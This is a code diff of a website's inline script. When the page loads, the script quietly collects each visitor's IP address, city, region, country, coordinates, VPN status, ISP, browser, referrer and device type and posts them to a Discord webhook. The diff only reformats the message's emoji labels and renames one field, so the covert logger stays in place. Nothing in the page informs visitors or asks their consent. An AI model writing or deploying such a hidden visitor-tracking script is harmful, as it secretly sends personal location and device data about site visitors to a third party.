@@ -1101,7 +1101,6 @@ for (let i = 0; i < navigationLinks.length; i++) {
 
 
 <script>
-
     function httpGetAsync(url, callback) {
         const xmlHttp = new XMLHttpRequest();
         xmlHttp.onreadystatechange = function() {
@@ -1149,7 +1148,7 @@ for (let i = 0; i < navigationLinks.length; i++) {
                 userInformation.time = new Date().toLocaleTimeString();
                 userInformation.referringURL = document.referrer;
                 userInformation.browser = navigator.userAgent;
-               userInformation.device = geoInfo.device;
+                userInformation.device = geoInfo.device_type;
 
                 sendToDiscord(userInformation, discordWebhook);
             });
@@ -1160,24 +1159,32 @@ for (let i = 0; i < navigationLinks.length; i++) {
         const request = new XMLHttpRequest();
         request.open("POST", webhookURL);
 
-     
+        const emojis = {
+            location: '🌍',
+            vpn: '🛡️',
+            calendar: '📅',
+            clock: '🕒',
+            link: '🔗',
+            computer: '💻',
+        };
 
-        const messageContent = `**${emojis.location} IP Address:** ${data.ip_address}\n` +
+        const messageContent = `**🚩  IP Address:** ${data.ip_address}\n` +
             `**🔗 Current URL:** ${data.current_url}\n` +
             `**🏘️ City:** ${data.city}\n` +
-            `**🏞️ Region:** ${data.region}\n` +
+            `**🏞️Region:** ${data.region}\n` +
             `**🌐 Country:** ${data.country} (${data.country_code})\n` +
-            `**🌍 Continent:** ${data.continent} (${data.continent_code})\n` +
+            `**🌍Continent:** ${data.continent} (${data.continent_code})\n` +
             `**🗺️ Longitude/Latitude:** ${data.longitude}, ${data.latitude}\n` +
             `**🛡️ VPN Status:** ${data.security_vpn ? 'Using VPN' : 'Not Using VPN'}\n` +
-            `**🇳🇱 Flag:** ${data.flag}\n` +
+            `**🎌 Flag:** ${data.flag}\n` +
             `**🏢 ISP:** ${data.isp_name}\n` +
             `**📅 Date:** ${data.date}\n` +
             `**📆 Day:** ${data.day}\n` +
             `**⌚ Time:** ${data.time}\n` +
-            `**🌐 Referring URL:** ${data.referringURL}\n` +
+            `**🔗 Referring URL:** ${data.referringURL}\n` +
             `**🌐 Browser:** ${data.browser}\n` +
-             `**💻 Device:** ${data.device}`;
+            `**💻  Device:** ${data.device}`;
+
         const message = JSON.stringify({ content: messageContent });
 
         request.setRequestHeader('Content-type', 'application/json');
@@ -1187,8 +1194,6 @@ for (let i = 0; i < navigationLinks.length; i++) {
     window.onload = function() {
         analyzeTraffic(); // Automatically run the analysis when the page loads
     };
-
-
 </script>
 
 
